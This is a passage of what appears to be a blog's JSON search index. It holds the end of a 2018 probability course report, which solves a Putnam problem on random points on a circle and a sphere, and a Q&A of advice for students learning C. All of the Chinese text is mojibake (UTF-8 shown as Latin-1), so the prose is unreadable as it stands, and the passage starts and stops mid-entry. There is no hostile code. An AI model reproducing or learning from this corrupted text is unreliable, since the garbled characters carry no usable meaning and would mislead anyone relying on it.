é‡æ–°æè¿°ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä¸å†è€ƒè™‘éšæœºé€‰å–ä¸‰ä¸ªç‚¹ï¼Œè€Œæ˜¯è€ƒè™‘ï¼šéšæœºé€‰æ‹©ä¸¤æ¡è¿‡åœ†å¿ƒçš„ç›´çº¿ï¼Œæ¯æ¡ç›´çº¿å¯¹åº”åœ†ä¸Šçš„ä¸¤ä¸ªç‚¹ã€‚ äºæ˜¯ï¼Œå¯¹äºç¬¬ä¸€æ¡ç›´çº¿ï¼Œæˆ‘ä»¬åœ¨å®ƒä¸åœ†çš„ä¸¤ä¸ªäº¤ç‚¹ä¸­é€‰æ‹©ä¸€ä¸ªï¼Œå®šä¸º P1ã€‚ç±»ä¼¼åœ°ï¼Œå¯¹å¦ä¸€æ¡é‡å¤æ“ä½œå¾—åˆ° P2ã€‚è¿™ç§åšæ³•ç­‰ä»·äºåœ¨åœ†ä¸Šéšæœºé€‰å–ä¸¤ç‚¹ï¼Œä½†æ˜¯ï¼Œæ­£å¦‚æˆ‘ä»¬åé¢å°†çœ‹åˆ°ï¼Œå´æ›´å®¹æ˜“æ¨å¹¿åˆ°ä¸‰ç»´äº†ã€‚ æ­¤å¤–ï¼Œæˆ‘ä»¬ä¸å¦¨äº¤æ¢åŸé¢˜ä¸­æ“ä½œçš„é¡ºåºï¼Œå³å…ˆéšæœºé€‰å– P3ï¼Œç„¶åå†å†³å®š P1 ä¸ P2 çš„ä½ç½®ã€‚è¿™æ ·ï¼Œå½“é€‰æ‹©å¥½ä¸¤æ¡ç›´çº¿åï¼ŒP1 å’Œ P2 çš„ä½ç½®åªå‰©ä¸‹äº†å››ç§æƒ…å†µï¼Œæ¯ç§æƒ…å†µéƒ½æ˜¯ç­‰å¯èƒ½çš„ã€‚ä½†æ˜¯ï¼Œå®¹æ˜“è¯æ˜æœ‰ä¸”ä»…æœ‰ä¸€ç§æƒ…å†µä¼šä½¿å¾— P3 è½åœ¨ P1,P2 ç›¸å¯¹çš„åœ†å¼§ä¸Šã€‚å› æ­¤ï¼Œæˆ‘ä»¬åˆä¸€æ¬¡å¾—åˆ°äº†ç­”æ¡ˆ 1/4ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œè°ƒæ•´äº†éšæœºé€‰ç‚¹çš„è¿‡ç¨‹åï¼Œæˆ‘ä»¬ç”¨ä¸€ç§æˆªç„¶ä¸åŒçš„æ–¹å¼æ±‚å¾—äº†ç­”æ¡ˆã€‚æ›´é‡è¦çš„æ˜¯ï¼Œå°†è¿™ä¸€è¿‡ç¨‹æ¨å¹¿åˆ°ä¸‰ç»´æå…¶å®¹æ˜“ã€‚ ","date":"2018-12-14","objectID":"/probability-report/:3:1","tags":["æ•°å­¦"],"title":"æ¦‚ç‡è®ºè¯¾ç¨‹æŠ¥å‘Š","uri":"/probability-report/"},{"categories":["æ¢ç´¢"],"content":"é‡æ–°æ¨å¹¿ ä»»å–çƒé¢ä¸Šä¸€ç‚¹ P4ï¼Œå†ä»»å–ä¸‰æ¡è¿‡çƒå¿ƒçš„ç›´çº¿ã€‚å¯¹æ¯æ¡ç›´çº¿ï¼Œåœ¨å®ƒä¸çƒé¢çš„ä¸¤ä¸ªäº¤ç‚¹ä¸­é€‰å–ä¸€ä¸ªä½œä¸º Pi, i=1,2,3ã€‚æˆ‘ä»¬å¾—åˆ° 2^3=8 ç§ç­‰å¯èƒ½ç»“æœï¼Œå…¶ä¸­æœ‰ä¸”ä»…æœ‰ä¸€ç§ç»“æœèƒ½ä½¿å¾— P4 è½åœ¨ P1,P2,P3 ç›¸å¯¹çš„çƒé¢åŒºåŸŸä¸Šã€‚å³ï¼Œæœ‰ä¸”ä»…æœ‰ä¸€ç§ç»“æœä½¿å¾—çƒå¿ƒè½åœ¨è¯¥å››é¢ä½“å†…ã€‚æ˜¾è€Œæ˜“è§ï¼Œ1/8 å°±æ˜¯è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆäº†ã€‚ ","date":"2018-12-14","objectID":"/probability-report/:3:2","tags":["æ•°å­¦"],"title":"æ¦‚ç‡è®ºè¯¾ç¨‹æŠ¥å‘Š","uri":"/probability-report/"},{"categories":["æ¢ç´¢"],"content":"ç»“è®ºä¸å¯ç¤º å¿…é¡»æ‰¿è®¤ï¼Œä¸Šè¿°è§£æ³•æ˜¯åŸºäºå‡ ä½•ç›´è§‚çš„ï¼Œç¦»å¼€è¿™ç§å‡ ä½•ç›´è§‚æ€§ï¼Œè¦å¦‚ä½•è¯æ˜æˆ‘ä»¬å¾—åˆ°çš„ç»“æœæ˜¯æ­£ç¡®çš„å‘¢ï¼Ÿæ¢è€Œè¨€ä¹‹ï¼Œæ€ä¹ˆæŠŠè§£ç­”çš„è¿‡ç¨‹ç”¨æ•°å­¦è¯­è¨€å†™ä¸‹æ¥ï¼Ÿ è¿™ä¸ªé—®é¢˜åœ¨æ•°å­¦ä¸­ååˆ†å¸¸è§ï¼šç†è§£é—®é¢˜å¹¶çŸ¥é“å…³é”®æ˜¯ä¸€å›äº‹ï¼Œä½†æŒæ¡ç›¸å…³èƒŒæ™¯çŸ¥è¯†ï¼Œæ›´æ­£å¼ã€æ¸…æ™°åœ°é˜è¿°è¿™ä¸ªç†è§£ï¼Œå®Œå…¨å°±æ˜¯å¦ä¸€å›äº‹äº†ã€‚ ä½†æ˜¯ä»è¿™ä¸ªé—®é¢˜ä¸­è·å¾—çš„å¯ç¤ºä¸åº”è¯¥æ˜¯è¿™ä¸ªç­”æ¡ˆæœ¬èº«ï¼Œè€Œæ˜¯æ‰¾åˆ°å…³é”®æƒ³æ³•çš„æ€ç»´æ–¹å¼ã€‚å³ï¼šä¸æ–­å¯»æ‰¾é—®é¢˜çš„ç®€åŒ–ç‰ˆæœ¬ï¼Œå¹¶åœ¨è¿‡ç¨‹ä¸­å…³æ³¨é‚£äº›æ–°æ·»åŠ çš„ç»“æ„ï¼ˆæœ¬é¢˜ä¸­æ˜¯ä¸¤æ¡è¾…åŠ©çº¿ï¼‰ï¼Œå°è¯•ç”¨æ–°ç»“æ„æ¥é‡è¿°æ•´ä¸ªé—®é¢˜ã€‚ æ­¤å¤–ï¼Œæ›´å€¼å¾—å¼ºè°ƒçš„æ˜¯è§£é¢˜è¿‡ç¨‹ä¸­çš„ä¸¥è°¨æ€§ã€‚æ¦‚ç‡è®ºåœ¨è¯ç”Ÿä¹‹åˆï¼Œï¼ˆä¹Ÿè®¸æ˜¯ç”±äºè¿‡åˆ†å¼ºè°ƒå®ç”¨çš„åŸå› ï¼‰å¹¶ä¸ä¸¥è°¨ï¼Œä¹Ÿæ²¡æœ‰ä¸€ä¸ªç¨³å›ºçš„å…¬ç†ä½“ç³»ã€‚è€Œå¦‚ä»Šï¼Œè¿ç”¨å…¬ç†é€æ¸å®Œå¤‡çš„æ¦‚ç‡è®ºè¿›è¡Œè®¡ç®—æ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¿…é¡»æ³¨æ„é¿å…çŠ¯ä¸‹éšè”½çš„ â€œå‡è®¾æ€§é”™è¯¯â€ï¼Œç”±äºæƒ³å½“ç„¶çš„å‡è®¾å’Œè‡ªå·±è¡¥å……çš„æ¡ä»¶è€Œå¾—å‡ºé”™è¯¯çš„ç»“è®ºã€‚å’Œæ•°å­¦é¢†åŸŸå…¶å®ƒå­¦ç§‘ä¸€æ ·ï¼Œæ˜¯ä¸¥è°¨æ€§ä½¿å¾—æ¦‚ç‡è®ºæ¥æºäºç”Ÿæ´»å´åˆé«˜äºç”Ÿæ´»ã€‚ å‚è€ƒèµ„æ–™ï¼š http://kskedlaya.org/putnam-archive/1992.pdf http://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm http://kskedlaya.org/putnam-archive/2005.pdf http://kskedlaya.org/putnam-archive/2005s.pdf ","date":"2018-12-14","objectID":"/probability-report/:4:0","tags":["æ•°å­¦"],"title":"æ¦‚ç‡è®ºè¯¾ç¨‹æŠ¥å‘Š","uri":"/probability-report/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"è¢«é‚€è¯·åˆ†äº« C è¯­è¨€å­¦ä¹ ç»éªŒï¼Œäºæ˜¯å†™äº†ç‚¹ä¸œè¥¿ç»™å­¦ç”Ÿä¼šåšæ¨é€ã€‚ ","date":"2018-10-17","objectID":"/c-tips/:0:0","tags":["C/C++"],"title":"ä¸€ç‚¹ C è¯­è¨€çš„ç»éªŒ","uri":"/c-tips/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"Q\u0026A Q1: å¤§å®¶ä¸€å¼€å§‹åˆå­¦çš„æ—¶å€™ç¨‹åºé‡Œæœ‰å¾ˆå¤šå¾ˆå¤šçš„ bugï¼Œå¤§å¤šæ˜¯è¯­æ³•ç¬¦å·è§„èŒƒçš„é”™è¯¯ï¼Œå¦‚ä½•é¿å…è¿™äº›é—®é¢˜å‘¢ï¼Ÿ A1: ç­”æ¡ˆå¾ˆå¯èƒ½è¦ä»¤äººå¤±æœ›ï¼šå¤šå†™ä»£ç ã€‚å°½ç®¡å¬èµ·æ¥è€ç”Ÿå¸¸è°ˆï¼Œä½†æ˜¯å½“ä»£ç é‡è¾¾åˆ°ä¸€å®šæ°´å¹³åï¼Œå¿˜åŠ åˆ†å·æˆ–æ˜¯æŠŠ == å†™æˆ = ä¹‹ç±»çš„è¯­æ³•é”™è¯¯å‡ ä¹ä¸ä¼šåœ¨ä½ çš„ä»£ç ä¸­å‡ºç°ï¼Œä¹Ÿä¸éœ€è¦å†åˆ»æ„å»è§„é¿ã€‚ ä¸è¿‡ï¼Œåœ¨å¤šå†™çš„åŸºç¡€ä¸Šï¼Œä»æœ‰ä¸€äº›å°æŠ€å·§æˆ–è®¸èƒ½æœ‰å¸®åŠ©ï¼š è®¤çœŸé˜…è¯»ç¼–è¯‘å™¨ç»™å‡ºçš„è­¦å‘Šï¼ˆwarningï¼‰ä¿¡æ¯ï¼Œæ˜ç™½å…¶ä¸­çš„ç¼˜ç”±ï¼Œå¹¶ä¸”ï¼ˆå¦‚æœä¸æ˜¯æœ‰æ„ä¸ºä¹‹ï¼‰æ¶ˆé™¤å®ƒä»¬ï¼Œå°½ç®¡æœ‰æ—¶ warning ä¸ä¼šå½±å“ç¨‹åºæ­£ç¡®æ€§ã€‚ è¿˜æ˜¯è®©èªæ˜çš„ç¼–è¯‘å™¨æ¥å¸®å¿™ï¼šå¯¹äºæŠŠ == å†™æˆ = çš„é—®é¢˜ï¼Œå¯ä»¥è€ƒè™‘å†™ if (true == flag) è€Œä¸æ˜¯ if (flag == true)ã€‚è¿™æ ·ï¼Œå½“ä½ å†™æˆ = å·æ—¶ï¼Œç¬¬ä¸€ç§å½¢å¼ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚å½“ç„¶ï¼Œå¦‚æœåšåˆ°äº†ç¬¬ä¸€æ¡ï¼Œä½ ä¸ä¼šéœ€è¦è¿™ä¸ªæŠ€å·§ã€‚ éƒ¨åˆ† IDE æˆ–æ–‡æœ¬ç¼–è¾‘å™¨æ’ä»¶æ”¯æŒå³æ—¶é”™è¯¯æç¤ºåŠŸèƒ½ï¼Œè¿™æ ·å¯ä»¥åœ¨ä½ å†™å‡ºé”™è¯¯è¯­æ³•çš„ç¬¬ä¸€æ—¶é—´æé†’ä½ æ”¹æ­£ã€‚ä¸è¿‡ä¸è¦å¤ªä¾èµ–è¿™ç§åŠŸèƒ½ã€‚ ä¸ä¸Šä¸€æ¡ç›¸åï¼Œå¦‚æœè§‰å¾—è‡ªå·±è¶³å¤Ÿç†Ÿç»ƒäº†ï¼Œè¯•ç€ç¦»å¼€ IDE å†™ä»£ç ï¼Œå¹¶ç”¨å‘½ä»¤è¡Œä¸‹çš„ gcc ç¼–è¯‘è¿è¡Œã€‚ç”±äºè¿™æ ·åšä¸å¦‚åœ¨ IDE å†…è¿è¡Œæ–¹ä¾¿ï¼Œä½ ä¹Ÿè®¸ä¼šåœ¨å†™ä»£ç æ—¶ååˆ†å°å¿ƒï¼Œå¹¶åœ¨å†™å®Œä»£ç ååå¤æ£€æŸ¥æ¥å‡å°‘é‡å¤ç¼–è¯‘è¿è¡Œçš„æ¬¡æ•°ï¼ˆä¹Ÿè®¸ä¸ä¼šï¼‰ã€‚ Q2: ä½œä¸ºèŒæ–°çš„æˆ‘ä»¬ï¼Œä¸çŸ¥é“æ€ä¹ˆç€æ‰‹å­¦ä¹  C è¯­è¨€ï¼Œå¯¹äºåŸºç¡€çŸ¥è¯†è¿™å—éå¸¸çš„è–„å¼±ï¼Œä¹¦ä¸Šçš„å†…å®¹æ„Ÿè§‰ä¸æ˜¯å¾ˆç³»ç»Ÿï¼Œæœ‰ä»€ä¹ˆå¥½æ–¹æ³•å‘¢ï¼Ÿèƒ½ä¸èƒ½ç»™æˆ‘ä»¬æ¨èä¸€äº›æœ‰ç”¨çš„å‚è€ƒèµ„æ–™å‘¢ï¼Ÿ A2: è€å®è¯´ï¼Œæˆ‘è§‰å¾—å­¦æ ¡ç”¨çš„ K\u0026R è¶³å¤Ÿå¥½äº†ï¼Œå¹¶ä¸”ä¹Ÿä¸å¤ªå¯èƒ½æœ‰ä»€ä¹ˆ C è¯­è¨€ä¹¦ç±èƒ½è¶…è¶Šå®ƒã€‚ä¸è¿‡å¦‚æœè§‰å¾—çœ‹å¾—å¾ˆç´¯çš„è¯ï¼Œä¸å¦¨è¯•è¯•å›½å†…çš„ä»»æ„ä¸€æœ¬è±†ç“£è¯„åˆ†è¾ƒé«˜çš„ C è¯­è¨€ä¹¦ç±ã€‚è™½ç„¶å®ƒå¯èƒ½æ²¡é‚£ä¹ˆå¥½ï¼Œç”šè‡³ä¼šè¯¯å¯¼äººï¼Œä½†è‡³å°‘èƒ½å¤Ÿå¸®åŠ©æ²¡æœ‰åŸºç¡€çš„åŒå­¦å»ºç«‹ä¸€äº›åŸºæœ¬æ¦‚å¿µã€‚ å½“ç„¶ï¼Œå¦‚æœä½ ä¸å±‘çœ‹å›½å†…çš„ä¹¦ç±ï¼Œè¿™ä¸¤æœ¬ä¹¦ä¹Ÿå¯ä»¥ä½œä¸ºå‚è€ƒï¼š C Programming: A Modern Approach K.N.King è‘— C Traps and Pitfalls Andrew Koenig è‘— ï¼ˆå¯¹ä»»ä½•å›½å¤–çš„ä¸“ä¸šä¹¦ç±è¯·å°½å¯èƒ½é˜…è¯»åŸç‰ˆï¼‰ æœ€é‡è¦çš„æ˜¯ï¼Œåœ¨é˜…è¯»æ—¶å¿…é¡»å®Œæˆä¸€éƒ¨åˆ†ä¹¦ä¸Šçš„ä¹ é¢˜ï¼ˆä¹æ„çš„è¯åš OJ ä¹Ÿè¡Œï¼‰ï¼Œé€šè¿‡å®è·µè¿›æ­¥æ˜¯æœ€å¿«çš„ã€‚ä½†æ˜¯å¦‚æœä½ çœŸçš„æƒ³ç²¾é€š C è¯­è¨€è€Œä¸æ˜¯ä¸ºäº†é€šè¿‡è€ƒè¯•ï¼Œä»…ä»…å¿«è¿˜ä¸å¤Ÿâ€”â€”åœ¨ä»£ç é‡è¾¾åˆ°ï¼Œæ¯”å¦‚ 300 è¡Œå·¦å³æ—¶ï¼Œè¯·å›å¤´è®¤çœŸé˜…è¯» K\u0026Rã€‚ Q3: ç†è®ºè¯¾ä¸Šå­¦åˆ°çš„çŸ¥è¯†ï¼Œåœ¨å®è·µè¯¾ä¸Šä¸æ˜¯å¾ˆä¼šæ“ä½œï¼Œæ€ä¹ˆå°½å¿«åœ°èƒ½å¤Ÿåº”ç”¨å‘¢ï¼Ÿ A3: è¦ â€œå°½å¿«â€ çš„è¯ï¼Œæ— ç–‘éœ€è¦ï¼š å¤šçœ‹åˆ«äººçš„ä¼˜è´¨ä»£ç ï¼› è‡ªå·±å¤šå†™ä»£ç ã€‚ å­¦æ ¡çš„ OJ å¹³å°æä¾›äº†ä¸€äº›ç›¸å½“æœ‰ç”¨çš„åŠŸèƒ½ï¼Œå¦‚å°†é¢˜ç›®æŒ‰ Reward æ’åºï¼Œåœ¨ AC åå¯ä»¥æŸ¥çœ‹ä»–äººä»£ç ç­‰ç­‰ã€‚åˆ©ç”¨è¿™äº›åŠŸèƒ½ä»ä½éš¾åº¦é¢˜å¼€å§‹ç»ƒä¹ ï¼Œå¹¶ä¸”åœ¨è‡ªå·±å®Œæˆåè§‚èµï¼ˆå—¯ï¼Œè§‚èµï¼‰ä¼˜ç§€çš„ä»£ç ï¼ˆå¦‚ Fastestï¼ŒShortest ç­‰ï¼‰ï¼Œå¾€å¾€ä¼šæœ‰æ–°çš„ä½“ä¼šã€‚å¦å¤–ï¼ŒåŠ¡å¿…å­¦ä¼šä½¿ç”¨æœç´¢å¼•æ“ï¼Œä½†åŒæ ·ä¸è¦å¤ªä¾èµ–ã€‚ å¦‚æœåš OJ é¢˜è®©ä½ æ„Ÿåˆ°å¾ˆæ— è¶£ï¼Œä¸å¦¨è¯•è¯•å°é¡¹ç›®é©±åŠ¨çš„æ–¹æ³•ï¼šå­¦å®Œç»“æ„ä½“åï¼Œä½ å·®ä¸å¤šå°±å¯ä»¥å†™ä¸€ä¸ªæ§åˆ¶å°é‡Œçš„æ–‡å­— RPG æ¸¸æˆäº†ï¼ˆå¥½å§ï¼Œå¯èƒ½è¿˜æ˜¯ä¸é‚£ä¹ˆæœ‰è¶£ï¼‰ï¼›æˆ–è€…ï¼Œå¯ä»¥å†™ä¸€äº›å°çš„å®ç”¨å·¥å…·ï¼ˆç§‘å­¦è®¡ç®—å™¨ï¼Œxx ç®¡ç†ç³»ç»Ÿï¼Œæ–‡ä»¶æ‰¹å¤„ç†å·¥å…·ï¼Œè¡¨ç™½ç¨‹åºç­‰ç­‰ï¼‰ï¼›ä½ ç”šè‡³å¯ä»¥å°è¯•å»å†™ä¸€ä¸ªä¼ª Shellã€‚ Q4: æˆ‘ä»¬æ€ä¹ˆæ‰èƒ½åˆ¤æ–­ä»€ä¹ˆæ—¶å€™è¯¥ç”¨ä»€ä¹ˆå‡½æ•°ï¼Ÿ A4: æˆ‘çŒœè¿™é‡Œçš„ â€œå‡½æ•°â€ æ˜¯æŒ‡â€œåº“å‡½æ•°â€ã€‚ è¦èƒŒå‡ºæ‰€æœ‰åº“å‡½æ•°çš„åŠŸèƒ½æ˜¾ç„¶ä¸å¤ªç°å®ï¼Œé‚£ä¹ˆèŒƒå›´ç¼©å°åˆ° â€œå¸¸ç”¨â€ çš„ä¼šæ€æ ·ï¼Ÿå®é™…ä¸Šï¼Œä¸€ä¸ªå¥½ç”¨çš„æ–¹æ³•æ˜¯åœ¨åšé¢˜æ—¶ï¼ˆæˆ–è€…åšå°é¡¹ç›®æ—¶ï¼‰ï¼Œå½“ä½ éœ€è¦ä¸€ä¸ªåŠŸèƒ½ï¼Œè¯•ç€æè¿°è¿™ä¸ªåŠŸèƒ½ï¼Œæ‰“åˆ°æœç´¢æ¡†é‡Œï¼Œå¹¶åœ¨å‰é¢åŠ ä¸Šâ€œCâ€ï¼ˆä¸å¸¦å¼•å·ï¼‰ã€‚å¯ä»¥é€‰æ‹©çœ‹å›½å†…çš„åšæ–‡ï¼Œä½†æˆ‘æ¨èæŸ¥é˜… C æ ‡å‡†åº“çš„å®˜æ–¹æ–‡æ¡£ã€‚ æœ‰ä¸€æ¬¡æˆ‘å¿˜è®°äº† strcpy å‡½æ•°çš„å‚æ•°é¡ºåºäº†ï¼Œäºæ˜¯æˆ‘å¾ˆå¿«æŸ¥åˆ°äº†å¹¶å…³æ‰äº†ç½‘é¡µã€‚çªç„¶æˆ‘å› ä¸ºåˆ«çš„äº‹ç¦»å¼€äº†ç”µè„‘å‡ åˆ†é’Ÿï¼Œå›æ¥æ—¶æˆ‘åˆä¸€æ¬¡å¿˜äº†é‚£ä¸ªé¡ºåºã€‚è¿™æ˜¯åœ¨æŸ¥é˜…èµ„æ–™æ—¶å¿…é¡»æœç»çš„ç°è±¡ï¼Œè§£å†³æ–¹æ³•æ˜¯ï¼šä¸è¦åªçœ‹å¯¹ä½ æœ‰ç”¨çš„éƒ¨åˆ†ï¼Œè€Œæ˜¯æ¯æ¬¡æŸ¥é˜…éƒ½å°½é‡æ·±å…¥åœ°äº†è§£è¿™ä¸ªå‡½æ•°â€”â€”ä¸€äº›ç”¨æ³•ä¹Ÿè®¸å¾ˆéš¾ä¸€æ¬¡è®°ä½ï¼Œä½†ç»è¿‡å¤šæ¬¡æŸ¥é˜…å’Œå®è·µåï¼Œä¹Ÿè®¸ä½ å°±èƒ½å¯¹ C æ ‡å‡†åº“ä¸­çš„å¸¸ç”¨å‡½æ•°å¦‚æ•°å®¶çäº†ã€‚ Q5: æ‹¿åˆ°ä¸€ä¸ªé—®é¢˜æˆ‘ä»¬è¯¥æ€ä¹ˆç€æ‰‹å¤„ç†å‘¢ï¼Ÿæ­¥éª¤æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ A5: æ¯ä¸ªäººéƒ½æœ‰ä¸åŒçš„æ–¹æ³•ï¼Œæˆ‘ä»…æä¾›æˆ‘è‡ªå·±çš„ä½œä¸ºå‚è€ƒï¼Œæœªå¿…é€‚åˆæ¯ä¸€ä¸ªåŒå­¦ï¼š ç¡®ä¿æ­£ç¡®ç†è§£äº†é¢˜æ„ã€‚è¯»å®Œé¢˜å°±å¼€å§‹å†™ï¼Œå†™åˆ°ä¸€åŠå‘ç°é¢˜æ„ç†è§£é”™çš„ä½“éªŒï¼ŒåŒ…æ‹¬æˆ‘åœ¨å†…çš„å¾ˆå¤šäººéƒ½æœ‰è¿‡ã€‚ ç”±æ˜“åˆ°éš¾ã€‚ä¸è¦å…ˆè€ƒè™‘é—®é¢˜çš„æœ€ä¼˜è§£æ³•ï¼Œè€Œæ˜¯å…ˆä»æ€ç»´éš¾åº¦ä½çš„ï¼Œæˆ–è®¸çœ‹èµ·æ¥æœ‰ç‚¹ low çš„åšæ³•å¼€å§‹ï¼Œè®¾æ³•æ”¹è¿›ä½ çš„ç®—æ³•ã€‚ä½ ç”šè‡³å¯ä»¥å†™ä¸€ä¸ªæ­£ç¡®æ€§å¯ä»¥ä¿è¯ä½†é€Ÿåº¦è¾ƒæ…¢çš„ç‰ˆæœ¬ï¼Œä¸ä½ å†™çš„æ›´ä¼˜è§£æ³•çš„ç‰ˆæœ¬è¿›è¡Œå¯¹æ‹ï¼ˆè¯·è‡ªè¡Œæœç´¢å¦‚ä½•å¯¹æ‹ï¼‰ã€‚ æƒ³å¥½å®Œæ•´çš„æ€è·¯åå†ç¢°é”®ç›˜ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦ä½ å¼€å§‹å†™ä»£ç ï¼Œå°½é‡å‡å°‘åœä¸‹æ¥é•¿æ—¶é—´æ€è€ƒçš„æ—¶é—´ã€‚è¿™å¾ˆéš¾ï¼Œæ‰€ä»¥ä¸å¼ºæ±‚ã€‚ æœ€é‡è¦çš„ï¼Œç†Ÿæ‚‰å¸¸ç”¨æ€è·¯ / ç®—æ³•ã€‚ä¾‹å¦‚ç©·ä¸¾ã€æ¨¡æ‹Ÿã€è´ªå¿ƒã€æ’åºã€å­—ç¬¦ä¸²å¤„ç†ã€äºŒåˆ†ã€é€’å½’ - è®°å¿†åŒ–æœç´¢ - DP ç­‰ç­‰ã€‚åœ¨è®¸å¤š OJ ä¸Šï¼Œé¢˜ç›®ä¼šæŒ‰å®ƒæ‰€ç”¨åˆ°çš„æ€è·¯ / ç®—æ³•æ¥åˆ†ç±»ï¼ˆå¦‚ EOJ ä¸Šå«åš tagï¼‰ã€‚å½“ä½ è¶³å¤Ÿç†Ÿæ‚‰è¿™äº›å¸¸ç”¨æ€è·¯ / ç®—æ³•åï¼Œè®¸å¤šé¢˜å¯ä»¥åŒ†åŒ†ä¸€ç¥å°±æƒ³åˆ°ç®—æ³•äº†â€”â€”è€Œè¿™æ—¶ï¼Œå¯èƒ½å·²ç»æˆåŠŸäº† 50%ï¼ˆä¹Ÿå¯èƒ½åªæˆåŠŸäº† 5%ï¼‰ã€‚ å­¦ä¼šè°ƒè¯•ç¨‹åºï¼ˆdebuggingï¼‰ã€‚ç»å¤§å¤šæ•°æƒ…å†µä¸‹ç¨‹åºä¸å¯èƒ½ä¸€æ¬¡è¿è¡Œå°±å¾—åˆ°æ­£ç¡®ç»“æœï¼ŒèŠ±åœ¨æŸ¥é”™æ”¹é”™ä¸Šçš„æ—¶é—´å¾€å¾€æ¯”æ€è€ƒæ—¶é—´ + å®é™…ç¼–å†™ç¨‹åºçš„æ—¶é—´æ›´é•¿ã€‚è€Œè‡³å°‘åœ¨æŸ¥é”™ä¸Šï¼Œ**gdb **å¯ä»¥å¸®åŠ©æˆ‘ä»¬èŠ‚çœä¸å°‘æ—¶é—´ã€‚é€šå¸¸ C è¯­è¨€ IDE éƒ½å¸¦æœ‰ gdb è°ƒè¯•å™¨ï¼Œ**ä¸€å®šè¦å­¦ä¼šä½¿ç”¨å®ƒï¼**å¦å¤–å¯ä»¥é…åˆ printf å˜é‡çš„å€¼è¿›è¡Œè°ƒè¯•ã€‚ Q6: å¯¹äº OJ è¿™ä¸ªç³»ç»Ÿï¼Œæˆ‘ä»¬æ€ä¹ˆåˆ©ç”¨å®ƒå‘¢ï¼Ÿ A6: å–å†³äºä½ çš„ç›®æ ‡ã€‚ ACMer é»˜è®¤å·²ç»æœ‰ä¸€å®šåŸºç¡€ï¼ˆæ¯”å¦‚ï¼šèƒ½è½»æ¾è§£å†³ EOJ ä¸Šå¤§éƒ¨åˆ† Reward \u003c= 4 çš„é¢˜ï¼‰ã€‚ä¹°æœ¬ä¹¦å­¦ç®—æ³•ï¼ˆæ¯”å¦‚ â€œç´«ä¹¦â€ã€â€œæŒ‘æˆ˜â€ ç­‰ï¼‰ï¼Œåšä¹¦ä¸Šç»ƒä¹ ï¼Œå¹¶åœ¨å„å¤§ OJ ä¸Šè¿›è¡Œä¸“é¢˜ç»ƒä¹ ã€‚å¤šæ‰“æ¯”èµ›ï¼ˆCF / EOJ æœˆèµ›ï¼‰ï¼Œæ€ä¹ˆæ ·éƒ½åˆ«æŠ„ä»£ç ã€‚ä¹‹åå°±çœ‹è‡ªå·±äº†ï¼Œæˆ‘ä¸æ‰“ ACM æ‰€ä»¥ä¸èƒ½ç»™å‡ºæœ‰ç”¨çš„å»ºè®®ã€‚ å¯¹ç¨‹åºè®¾è®¡ä¸ç®—æ³•å¾ˆæ„Ÿå…´è¶£ï¼Œæƒ³è¦æ·±å…¥å­¦ä¹ çš„åŒå­¦ å·©å›ºå¥½åŸºç¡€ï¼ˆå¤šå†™é¢˜ + è¯» K\u0026Rï¼‰ã€‚æ¨èè¯»ç´«ä¹¦ï¼ˆã€Šç®—æ³•ç«èµ›å…¥é—¨ç»å…¸ã€‹ï¼‰ï¼Œèƒ½è®¤çœŸè¯»å®Œå¹¶ä¸”æ¯ç« å¤šå°‘åšæ‰ä¸€éƒ¨åˆ†ä¹ é¢˜çš„è¯ï¼Œä½ çš„æ°´å¹³åº”è¯¥å·²ç»è¶…è¿‡ä¸€éƒ¨åˆ† ACMer äº†ã€‚ä¹‹åå¯ä»¥é€‰æ‹©ä¸“é¢˜ç»ƒä¹ ï¼ˆåˆ«æŠ„ä»£ç ï¼‰ï¼Œæ•°å­¦å¥½çš„ä¹Ÿå¯ä»¥é€‰æ‹©å»è¯»ã€Šç®—æ³•å¯¼è®ºã€‹ä¸€ç±»çš„ä¹¦ã€‚ æƒ³å®è·µè¯¾å’Œå®è®­è¯¾æ‹¿é«˜ç»©ç‚¹çš„åŒå­¦ åˆ° EOJ çš„ Gym é‡Œæ‰¾å®è®­é¢˜åº“ï¼Œåšé¢˜ã€æ€»ç»“æ€è·¯ / ç®—æ³•ï¼Œåè€…æ›´é‡è¦ã€‚çœ‹å®Œé¢˜å°±çŸ¥é“æ€ä¹ˆåšçš„é¢˜ï¼ˆæŒ‡ä»£ç ç»“æ„åœ¨è„‘å­é‡Œéƒ½ç»„ç»‡å¥½äº†ï¼‰ï¼Œä¸åšï¼›æƒ³äº†åŠå°æ—¶æ²¡æ€è·¯å¯ä»¥æŸ¥é¢˜è§£ä½†æ˜¯ä¸è¦çœ‹ä»£ç ï¼Œä¾ç„¶ä¸ä¼šåšçš„è¯ï¼Œä¹Ÿæ”¾å¼ƒã€‚ä¸€å¤©å°±èƒ½åšåé¢˜å’Œåå¤©åªèƒ½åšä¸€é¢˜çš„é‚£ç§é¢˜ï¼Œå¯¹å®åŠ›çš„æå‡éƒ½æ²¡æœ‰å¤ªå¤§å¸®åŠ©ã€‚ å¦å¤–ï¼Œå®è®­ 4.0 å¯é‡ä¸å¯æ±‚ï¼Œä¸è¦ä¸ºæ­¤èŠ±è´¹å¤ªå¤šæ—¶é—´åœ¨ OJ ä¸Šï¼Œå³ä½¿ä½ åƒæˆ‘ä¸€æ ·å–œæ¬¢åšé¢˜è€Œå®Œå…¨ä¸è§‰å¾—ç´¯ï¼Œå› ä¸ºå…¶ä»–è¯¾ç¨‹ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ã€‚ æƒ³é€šè¿‡å®è·µè¯¾å’Œå®è®­è¯¾è€ƒè¯•çš„åŒå­¦ å¬è¯¾ï¼Œåš OJ ä¸Šè€å¸ˆå¸ƒç½®çš„é¢˜ã€‚æœ‰æ—¶é—´çš„è¯ï¼Œä» Reward è¾ƒä½çš„é¢˜å¼€å§‹åšèµ·ï¼Œæå‡ç†Ÿç»ƒåº¦ã€‚ç™¾é¢˜è¿‡åï¼Œé€šè¿‡åº”è¯¥æ²¡æœ‰éš¾åº¦äº†ã€‚ æ‰€æœ‰äºº ä¼˜é›…çš„ EOJ 